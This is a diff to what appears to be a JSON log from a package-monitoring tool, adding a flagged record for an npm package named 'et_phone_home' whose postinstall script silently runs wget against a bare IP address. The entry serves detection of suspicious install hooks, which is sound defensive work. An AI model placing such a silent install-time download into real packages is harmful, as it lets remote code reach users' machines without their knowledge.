@@ -1,5 +1,15 @@
 [
   {
+    "packageName": "et_phone_home",
+    "version": "0.0.5",
+    "scriptType": "postinstall",
+    "scriptContent": "wget -q http://176.31.142.25/javascript_no_way_you_got_here_randomly",
+    "previousVersion": "0.0.4",
+    "timestamp": "2026-04-14T06:05:40.888Z",
+    "issuesend": true,
+    "suspicionScore": 16
+  },
+  {
     "packageName": "ember-flickity",
     "version": "0.2.0",
     "scriptType": "prepare-release",
